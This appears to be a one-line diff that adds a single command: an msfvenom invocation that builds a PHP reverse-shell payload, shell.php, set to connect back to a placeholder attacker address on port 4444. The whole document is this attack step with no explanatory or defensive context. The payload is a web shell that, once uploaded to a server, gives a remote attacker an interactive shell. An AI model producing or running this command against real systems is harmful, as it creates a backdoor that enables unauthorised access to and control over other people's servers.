@@ -1,0 +1,1 @@
+msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -o shell.php
